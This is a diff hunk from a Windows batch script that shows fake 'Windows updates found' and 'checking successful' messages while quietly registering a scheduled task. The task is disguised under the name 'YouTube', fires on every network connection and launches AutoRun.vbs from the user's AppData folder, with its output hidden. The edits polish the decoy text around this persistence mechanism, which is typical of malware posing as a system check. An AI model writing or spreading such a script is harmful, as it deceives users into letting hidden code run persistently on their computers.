@@ -376,10 +376,10 @@ echo Please, wait...
 timeout 2 > NUL
 echo.
 echo.
-echo Updates found! Please update your pc or
+echo Windows updates found! Please update or
 echo Visit: https://support.microsoft.com/en-us/windows
 timeout 6 > NUL
-echo Windows regular checking successful..!!
+echo Successful Regular checking..!!
 timeout 3
 
 schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" /F > nul 2> nul 
